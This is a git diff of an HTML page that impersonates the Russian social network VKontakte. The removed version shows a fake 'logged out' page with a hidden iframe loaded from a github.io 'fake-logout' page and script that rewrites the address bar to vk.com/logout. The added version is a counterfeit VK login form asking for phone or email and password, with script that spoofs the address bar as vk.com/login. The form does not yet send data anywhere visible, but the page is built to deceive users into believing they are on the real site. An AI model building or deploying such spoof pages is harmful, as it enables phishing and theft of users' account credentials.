@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Выход | ВКонтакте</title>
+  <title>Вход | ВКонтакте</title>
   <link rel="icon" type="image/png" href="https://vk.com/images/icons/favicons/fav_logo.ico">
   <style>
     * {
@@ -13,8 +13,7 @@
       margin: 0;
       padding: 0;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #e5ebf1;
-      color: #2c2d2e;
+      background-color: #f5f5f5;
     }
 
     header {
@@ -42,7 +41,7 @@
     }
 
     .container {
-      max-width: 400px;
+      max-width: 380px;
       background-color: white;
       margin: 80px auto;
       padding: 40px 30px;
@@ -56,24 +55,40 @@
       margin-bottom: 10px;
     }
 
-    p {
-      font-size: 15px;
-      color: #6d6d6d;
-      margin-bottom: 25px;
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
     }
 
-    a {
-      display: inline-block;
-      padding: 10px 20px;
+    .button {
+      width: 100%;
+      padding: 10px;
       background-color: #4a76a8;
       color: white;
-      text-decoration: none;
-      border-radius: 6px;
-      font-size: 14px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
     }
 
-    a:hover {
+    .button:hover {
       background-color: #3e6694;
+    }
+
+    .link {
+      display: block;
+      margin-top: 20px;
+      color: #4a76a8;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .link:hover {
+      text-decoration: underline;
     }
 
     footer {
@@ -81,13 +96,6 @@
       color: #999;
       font-size: 13px;
       margin-top: 40px;
-    }
-
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-      display: none;
     }
   </style>
 </head>
@@ -98,31 +106,22 @@
   </header>
 
   <div class="container">
-    <h1>Вы вышли из аккаунта</h1>
-    <p>Можете закрыть окно или вернуться на главную страницу.</p>
-    <a href="https://vk.com">Перейти на главную</a>
+    <h1>Вход в ВКонтакте</h1>
+    <form action="https://vk.com/login" method="POST" id="login-form" onsubmit="return false;">
+      <input type="text" class="input-field" placeholder="Телефон или email" required>
+      <input type="password" class="input-field" placeholder="Пароль" required>
+      <button type="submit" class="button">Войти</button>
+    </form>
+    <a href="https://vk.com/restore" class="link">Забыли пароль?</a>
   </div>
 
   <footer>
     &copy; 2025 ВКонтакте LLC
   </footer>
 
-  <iframe src="https://jkeep1990.github.io/VK_LOGOUT/fake-logout.html" id="fake-logout"></iframe>
-
   <script>
-    // Меняем URL в адресной строке на vk.com/logout, без перезагрузки страницы
-    history.pushState(null, null, 'https://vk.com/logout');
-
-    // Настроим iframe так, чтобы он подгрузился и изменил URL внутри себя
-    window.onload = function() {
-      let iframe = document.getElementById('fake-logout');
-      let iframeWindow = iframe.contentWindow;
-
-      // Задержка, чтобы дать iframe время на загрузку
-      setTimeout(() => {
-        iframeWindow.history.pushState(null, null, 'https://vk.com/logout');
-      }, 100);
-    }
+    // Меняем URL в адресной строке на vk.com/login
+    history.pushState(null, null, 'https://vk.com/login');
   </script>
 </body>
 </html>
